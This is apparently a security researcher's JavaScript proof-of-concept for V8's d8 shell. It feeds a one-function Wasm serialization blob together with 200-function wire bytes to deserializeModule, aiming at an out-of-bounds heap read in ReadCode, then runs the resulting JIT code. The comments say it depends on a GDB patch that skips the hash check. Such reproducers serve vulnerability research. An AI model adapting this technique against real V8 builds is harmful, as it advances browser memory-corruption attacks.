// ReadCode OOB Trigger — hash guard bypass via GDB (see poc_gdb_trigger.py)
//
// d8.wasm.deserializeModule is called with:
//   arg0 = blob_1fn  : ArrayBuffer  = blob serialized from 1-function module
//   arg1 = wire_200fn: Uint8Array   = wire bytes of a 200-function module
//
// Normally the hash guard rejects this (hash mismatch).
// GDB intercepts at 0x665e55 and redirects $rip to 0x665ee4 (success path).
// DeserializeNativeModule(blob_1fn, wire_200fn) then calls
// NativeModuleDeserializer::Read which loops num_functions()=200 times.
// After function 0 the blob is exhausted; functions 1-199 read OOB from heap.
// Expected crash: CHECK_LE or CHECK_EQ fatal in wasm-serialization.cc

'use strict';

// --- 1-function Wasm module: (func (result i32) i32.const 42) ---
const wire1fn = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,  // magic + version
  0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,          // type: () -> i32
  0x03, 0x02, 0x01, 0x00,                            // func section: 1 fn, type 0
  0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, // export "main"
  0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b    // code: i32.const 42 end
]);

// --- Build 200-function Wasm module wire bytes ---
function buildWire200() {
  function leb128(n) {
    const r = [];
    do { let b = n & 0x7f; n >>>= 7; r.push(n ? b | 0x80 : b); } while (n);
    return r;
  }
  const N = 200;
  // Type section: 1 type () -> i32
  const typeSec  = [0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f];
  // Function section: N functions of type 0
  const fnIdxs   = new Array(N).fill(0x00);
  const fnPayload= [...leb128(N), ...fnIdxs];
  const funcSec  = [0x03, ...leb128(fnPayload.length), ...fnPayload];
  // Code section: N bodies, each = [4 bytes: 0 locals, i32.const 0, end]
  const body     = [0x04, 0x00, 0x41, 0x00, 0x0b];  // length=4, body
  const codeBodies = [];
  for (let i = 0; i < N; i++) codeBodies.push(...body);
  const codePayload = [...leb128(N), ...codeBodies];
  const codeSec  = [0x0a, ...leb128(codePayload.length), ...codePayload];

  const hdr = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];
  return new Uint8Array([...hdr, ...typeSec, ...funcSec, ...codeSec]);
}

const wire200 = buildWire200();

// Validate: wire200 must decode to exactly 200 functions
print(`[*] wire_1fn  : ${wire1fn.length} bytes`);
print(`[*] wire_200fn: ${wire200.length} bytes`);

// Quick sanity: last section byte should be 0x0b (end)
print(`[*] wire_200fn tail: ...${Array.from(wire200.slice(-4)).map(b=>b.toString(16).padStart(2,'0')).join(' ')}`);

// --- Compile and serialize the 1-function module ---
print('[*] Compiling 1-fn module (--no-liftoff --no-wasm-lazy-compilation)...');
const mod1 = new WebAssembly.Module(wire1fn);
const inst1 = new WebAssembly.Instance(mod1);
print(`[*] Instance created, main()=${inst1.exports.main()}`);

print('[*] Serializing 1-fn module...');
const blob1fn = d8.wasm.serializeModule(mod1);
if (!blob1fn || blob1fn.byteLength === 0) {
  print('[!] FAIL: serialize returned empty. Try without --correctness-fuzzer-suppressions');
  quit(1);
}
print(`[*] blob_1fn: ${blob1fn.byteLength} bytes`);
print(`[*] blob header: ${Array.from(new Uint8Array(blob1fn).slice(0,16)).map(b=>b.toString(16).padStart(2,'0')).join(' ')}`);

// --- Trigger the OOB ---
// GDB intercepts at 0x665e55 (ThrowError for manipulated bytes) and
// redirects $rip to 0x665ee4 (mutex unlock → DeserializeNativeModule path)
print('');
print('[*] ══════════════════════════════════════════════════════════');
print('[*]  Calling d8.wasm.deserializeModule(blob_1fn, wire_200fn)');
print('[*]  GDB breakpoint at 0x665e55 must be active for OOB trigger');
print('[*] ══════════════════════════════════════════════════════════');
print('');

try {
  const modOOB = d8.wasm.deserializeModule(blob1fn, wire200);
  print('[!] deserializeModule returned (hash guard was bypassed by GDB)');
  print('[!] OOB occurred in ReadCode — JIT may contain heap garbage');
  try {
    const instOOB = new WebAssembly.Instance(modOOB);
    print('[!] Instance created — OOB bytes in JIT will now execute');
    // Calling exported function executes whatever bytes are in JIT:
    instOOB.exports.main();
    print('[!] Returned from OOB JIT execution (probably crashed above)');
  } catch(e2) {
    print(`[!] Instance/execution exception: ${e2}`);
  }
} catch(e) {
  print(`[!] Exception (hash guard not bypassed): ${e}`);
  print('[!] Run this script via poc_gdb_trigger.py');
}
